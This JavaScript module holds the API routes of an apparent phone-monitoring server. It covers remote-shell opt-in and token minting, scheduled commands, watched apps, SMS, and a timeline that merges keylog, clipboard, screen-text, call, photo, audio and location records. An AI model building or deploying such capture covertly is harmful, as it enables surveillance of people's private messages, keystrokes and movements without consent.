module.exports = ({ app, crypto, db, emitToDevice, log, maybeRespondWithZkPayloads, requireAuth, requireDeviceAccess, requireDeviceController, requirePerm, requireUnlocked, stmts }) => {
  // Purge every AUTO-learned anchor for this device's owner (manual anchors are always kept).
  // Misplaced anchors are why "fix → anchor" lines point at the wrong places; auto anchors
  // re-learn from new scans (now time-aligned — see autoCalibrateAnchors). Called by the
  // audit modal's "Delete all auto-learned anchors" button.
  app.post('/api/devices/:id/anchors/purge-auto', requireUnlocked, requireAuth, requireDeviceAccess, requirePerm('location'), async (req, res) => {
    try {
      const dev = (await stmts.getDevice.get(req.params.id));
      const ownerId = dev?.owner_user_id ? String(dev.owner_user_id) : null;
      if (!ownerId) return res.status(400).json({ error: 'device has no owner' });
      const { changes } = (await db.prepare(
        "DELETE FROM proximity_anchors WHERE user_id=? AND origin='auto'"
      ).run(ownerId));
      const deleted = Number(changes) || 0;
      log('info', 'Auto-learned anchors purged', { deviceId: req.params.id, ownerId, deleted });
      res.json({ ok: true, deleted });
    } catch (e) { res.status(500).json({ error: e.message }); }
  });

  // BT scanner ON/OFF state — control-plane (works for admin AND ZK-owned devices, since the
  // device reports it via the dedicated plaintext bt_scan_state event regardless of ownership).
  app.get('/api/devices/:id/bt-scan-state', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const row = await db.prepare('SELECT bt_scan_state FROM device_telemetry WHERE device_id=?').get(req.params.id);
    res.json({ scanning: !!(row?.bt_scan_state) });
  });

  app.get('/api/devices/:id/shell-sessions', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const rows = (await db.prepare('SELECT id,command,output,timestamp FROM shell_sessions WHERE device_id=? ORDER BY timestamp DESC LIMIT 100').all(req.params.id));
    res.json(rows);
  });

  // ── Remote shell opt-in (sentinel-adb CLI) — per device ──────────────────────────
  // Default OFF: operator-token shell access requires the owner to explicitly enable it
  // under the Shell tab (with an explainer modal). The dashboard terminal is unaffected.
  app.get('/api/devices/:id/remote-shell', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const row = (await db.prepare('SELECT remote_shell_enabled FROM devices WHERE id=?').get(req.params.id));
    res.json({ enabled: !!row?.remote_shell_enabled });
  });
  app.post('/api/devices/:id/remote-shell', requireUnlocked, requireAuth, requireDeviceAccess, requireDeviceController(), async (req, res) => {
    const enabled = !!req.body?.enabled;
    await db.prepare('UPDATE devices SET remote_shell_enabled=? WHERE id=?').run(enabled ? 1 : 0, req.params.id);
    if (!enabled) {
      // Revoke this device's connect tokens so previously copied commands die immediately.
      (await db.prepare("UPDATE operator_tokens SET revoked=1 WHERE device_id=? AND revoked=0").run(req.params.id)).catch(() => {});
    }
    log('info', `Remote shell ${enabled ? 'ENABLED' : 'disabled'}`, { deviceId: req.params.id, by: req.session.username || req.session.userId });
    res.json({ ok: true, enabled });
  });

  // Per-device connect token: mints a FRESH shell-scoped token for exactly this device
  // (revoking any previous ones for it) and returns the plaintext once — it feeds the
  // copyable `sentinel-adb --url … --token … <id>` connect command. Showing a new command
  // rotates credentials: previously copied commands stop working. Same guards as the toggle.
  app.get('/api/devices/:id/shell-token', requireUnlocked, requireAuth, requireDeviceAccess, requireDeviceController(), async (req, res) => {
    const deviceId = req.params.id;
    await db.prepare("UPDATE operator_tokens SET revoked=1 WHERE device_id=? AND revoked=0 AND scopes LIKE '%shell%'").run(deviceId).catch(() => {});
    const token = 'snt_' + crypto.randomBytes(32).toString('base64url');
    const hash = crypto.createHash('sha256').update(token).digest('hex');
    await db.prepare('INSERT INTO operator_tokens (name, token_hash, scopes, device_id, created_at, revoked) VALUES (?,?,?,?,?,0)')
      .run('shell-connect', hash, 'shell', deviceId, Date.now());
    log('info', 'Shell connect token minted', { deviceId, by: req.session.username || req.session.userId });
    res.json({ token, deviceId });
  });

  // Scheduled commands
  app.get('/api/devices/:id/schedules', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const rows = (await db.prepare('SELECT * FROM scheduled_commands WHERE device_id=? ORDER BY next_run ASC').all(req.params.id));
    res.json(rows.map(r => ({ ...r, params: JSON.parse(r.params || '{}') })));
  });
  app.post('/api/devices/:id/schedules', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const { label='', command, params={}, repeat_type='once', run_at, days=null, tz=null } = req.body;
    if (!command || !run_at) return res.status(400).json({ error: 'command and run_at required' });
    const daysCsv = Array.isArray(days) ? days.join(',') : (days || null);
    const result = (await db.prepare('INSERT INTO scheduled_commands (device_id,label,command,params,repeat_type,run_at,next_run,days,tz) VALUES (?,?,?,?,?,?,?,?,?) RETURNING id')
      .get(req.params.id, label, command, JSON.stringify(params), repeat_type, run_at, run_at, daysCsv, tz));
    res.json({ id: result.id });
  });
  app.delete('/api/devices/:id/schedules/:sid', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    (await db.prepare('DELETE FROM scheduled_commands WHERE id=? AND device_id=?').run(req.params.sid, req.params.id));
    res.json({ ok: true });
  });
  app.patch('/api/devices/:id/schedules/:sid', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const { enabled } = req.body;
    (await db.prepare('UPDATE scheduled_commands SET enabled=? WHERE id=? AND device_id=?').run(enabled ? 1 : 0, req.params.sid, req.params.id));
    res.json({ ok: true });
  });
  // Bulk-delete every schedule row for one app (label = 'aps:<package>'). A per-app
  // pause/unpause schedule is stored as up to two rows, so this clears it in one call.
  app.delete('/api/devices/:id/app-schedule/:pkg', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    (await db.prepare('DELETE FROM scheduled_commands WHERE device_id=? AND label=?').run(req.params.id, 'aps:' + req.params.pkg));
    res.json({ ok: true });
  });

  // Alert config
  app.get('/api/devices/:id/alert-config', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const rows = (await db.prepare('SELECT * FROM alert_config WHERE device_id=?').all(req.params.id));
    res.json(rows);
  });
  app.post('/api/devices/:id/alert-config', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const { type, threshold, enabled=1 } = req.body;
    if (!type) return res.status(400).json({ error: 'type required' });
    (await db.prepare('INSERT INTO alert_config (device_id,type,threshold,enabled) VALUES (?,?,?,?) ON CONFLICT(device_id,type) DO UPDATE SET threshold=excluded.threshold,enabled=excluded.enabled')
      .run(req.params.id, type, String(threshold), enabled ? 1 : 0));
    res.json({ ok: true });
  });

  // Watched apps
  app.get('/api/devices/:id/watched-apps', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const rows = (await db.prepare('SELECT pkg FROM watched_apps WHERE device_id=?').all(req.params.id));
    res.json(rows.map(r => r.pkg));
  });
  app.post('/api/devices/:id/watched-apps', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const { pkg } = req.body;
    if (!pkg) return res.status(400).json({ error: 'pkg required' });
    (await db.prepare('INSERT INTO watched_apps (device_id,pkg) VALUES (?,?) ON CONFLICT DO NOTHING').run(req.params.id, pkg));
    (await syncWatchedApps(req.params.id));
    res.json({ ok: true });
  });
  app.delete('/api/devices/:id/watched-apps/:pkg', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    (await db.prepare('DELETE FROM watched_apps WHERE device_id=? AND pkg=?').run(req.params.id, req.params.pkg));
    (await syncWatchedApps(req.params.id));
    res.json({ ok: true });
  });

  // SMS outbox
  app.get('/api/devices/:id/sms-outbox', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    if ((await maybeRespondWithZkPayloads(req, res, 'sms_list'))) return;
    const rows = (await db.prepare('SELECT * FROM sms_outbox WHERE device_id=? ORDER BY timestamp DESC LIMIT 200').all(req.params.id));
    res.json(rows);
  });

  // Timeline — merged feed of all event types for a device
  app.get('/api/devices/:id/timeline', requireUnlocked, requireAuth, requireDeviceAccess, async (req, res) => {
    const id  = req.params.id;
    const lim = Math.min(parseInt(/** @type {any} */ (req.query.limit)) || 200, 500);
    const events = [];
    const queries = [
      ['notification', `SELECT timestamp,'notification' AS type,pkg AS summary FROM notifications WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
      ['clipboard',    `SELECT timestamp,'clipboard' AS type,'Clipboard captured' AS summary FROM clipboard_events WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
      ['location',     `SELECT timestamp,'location' AS type,'Location update' AS summary FROM locations WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
      ['photo',        `SELECT timestamp,'photo' AS type,'Photo captured' AS summary FROM media WHERE device_id=? AND type!='audio' ORDER BY timestamp DESC LIMIT ?`],
      ['audio',        `SELECT timestamp,'audio' AS type,'Audio recording' AS summary FROM media WHERE device_id=? AND type='audio' ORDER BY timestamp DESC LIMIT ?`],
      ['status',       `SELECT timestamp,'status' AS type,event_type AS summary FROM device_status_events WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
      ['sms',          `SELECT timestamp,'sms' AS type,'SMS message' AS summary FROM sms_messages WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
      ['call',         `SELECT timestamp,'call' AS type,'Phone call' AS summary FROM call_logs WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
      ['keylog',       `SELECT timestamp,'keylog' AS type,'Keylog data' AS summary FROM keylog_entries WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
      ['screen_text',  `SELECT timestamp,'screen_text' AS type,pkg AS summary FROM screen_text_entries WHERE device_id=? ORDER BY timestamp DESC LIMIT ?`],
    ];
    for (const [name, sql] of queries) {
      try { (await db.prepare(sql).all(id, lim)).forEach(r => events.push(r)); }
      catch (e) { log('warn', `timeline query failed: ${name}`, { error: e.message }); }
    }
    events.sort((a, b) => b.timestamp - a.timestamp);
    res.json(events.slice(0, lim));
  });

  // Helper: push updated watched-app list to device
  async function syncWatchedApps(deviceId) {
    const pkgs = (await db.prepare('SELECT pkg FROM watched_apps WHERE device_id=?').all(deviceId)).map(r => r.pkg);
    emitToDevice(deviceId, 'command', { command: 'set_watched_apps', packages: pkgs });
  }
};